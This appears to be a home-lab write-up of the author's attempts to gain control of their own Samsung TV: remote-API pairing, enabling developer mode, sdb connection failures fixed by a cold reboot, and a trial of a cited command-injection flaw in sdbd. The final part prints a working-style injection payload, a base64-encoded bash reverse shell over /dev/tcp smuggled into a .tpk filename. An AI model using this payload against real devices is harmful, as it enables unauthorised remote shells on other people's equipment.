01The timeline, phase by phase

Click a phase to open it. Every command shown was run on the real machine.

Samsung's official “remote over the network” API. We paired from the Mac, captured a PIN the TV printed, and stored the bearer token (it survives reboots).

wss://192.168.1.119:8002/api/v2/channels/samsung.remote.control?name=U2Ftc3VuZ1JlbW90ZUFwcA== {"event":"req","id":"pairing","data":"pairing"} → PIN on TV {"event":"req","id":"pairing","data":"<PIN>"} → bearer token → token.txt

Hard-won gotchas: the TV drops keys sent before its ms.channel.connect ack; and key names lie per generation — KEY_VOLUMEUP is a ghost, KEY_VOLUP is real. Both fixed in remote.js. Verified live: volume 7 → 10, mute toggle.

No menu toggle exists on this model. The real path, found by trial and confirmed against Samsung docs: Home → Apps → “App Settings” (bottom of the apps panel) → press the 123 button on the remote → type 12345 on the on-screen keypad.

The dialog has exactly one toggle and one IP field — the development computer's IP (the Mac, 192.168.1.7). No Reconnect button, no SSH/TSS checkboxes. API-verified: developerMode: "1", developerIP: "192.168.1.7".

An evening of everything that should have worked and didn't:

raw sdb 1.0.0 connect 26101 → unable to connect tss-1.0 UDP → TV:49001 (5 payloads) → no reply TSS server on MAC :49001, TV cycled → TV never greets host sdbd :26099 + connect → TV never dials in full port scan, dev mode on → only 8080 open

Verdict at the wall: the protocol was fine (our own macOS build of sdb proved it). The TV simply had no daemon to talk to.

The scout's 2026 research found the diagnosis, and it fits every symptom:

sdbd snapshots the developer IP only at true boot. Standby is not a boot. (community record, 2020–2025 branded sets) $ unplug 30s → plug in → power on $ nc -z -w 2 192.168.1.119 26101 26101 OPEN $ sdb devices 192.168.1.119:26101 device

No CVE, no payload. Every “reboot” we'd tried was a KEY_POWER (standby). The TV had never booted with the IP already committed. That one unplug did what every handshake, daemon and retry could not.

Bishop Fox (Feb 2026): SVE-2025-50109 — command injection in sdbd's vd_appinstall: the .tpk filename passes through a device-side system(). Demonstrated on a 2020 TU-series and a 2022 CU-7000 — our family.

sdb install "new$(echo <b64: bash -i >& /dev/tcp/192.168.1.7/PORT 0>&1 | base64 -d | bash).tpk" → device shell expands $(…) before install even starts

We fired it through two client generations. It was accepted without error… and no shell came home. The timing test exposed why:

exec('shell:0 sleep 5 && echo SLEPT') → returned in 6ms, empty

shell:0 is a no-op stub on this firmware. Only sdbd builtins answer (getduid → our real DUID; uname/ls/pulls → empty). Next move: decompile sdbd and read the gate with our own eyes.

04The CVE, exploded

SVE-2025-50109 in one line: the .tpk filename argument is fed to a device-side system(). A path containing $(cmd) executes on the TV before the installer even checks the file.

$ sdb install "new$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNy80OTA4OCAwPiYx | base64 -d | bash).tpk" └── base64 of: bash -i >& /dev/tcp/192.168.1.7/49088 0>&1 ──┘ 1. TV shell expands $( … ) → bash -i runs on the TV 2. bash -i dials the Mac at 192.168.1.7:49088 3. the interactive prompt lands in our nc listener → OS shell
command the injection vector what it decodes to execution order on the TV

Why it didn't land on our set: the same firmware that stubs shell:0 (a 5-second sleep returned in 6ms) likely trims the exec path too. The proof will come from decompiling sdbd — which is exactly what REA + Ghidra are for, and why the firmware is the final missing piece.
